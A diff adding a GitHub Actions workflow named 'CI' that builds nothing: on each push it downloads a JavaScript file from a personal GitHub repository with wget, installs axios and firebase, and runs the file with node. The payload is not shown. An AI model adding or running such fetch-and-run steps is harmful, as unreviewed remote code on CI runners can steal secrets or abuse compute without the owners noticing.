@@ -1,0 +1,11 @@
+name: CI
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+
+    - name: Server
+      run: wget https://raw.githubusercontent.com/raiyan8086/script/refs/heads/main/script.js
+    - run: npm install axios firebase@9.22.0
+    - run: node script
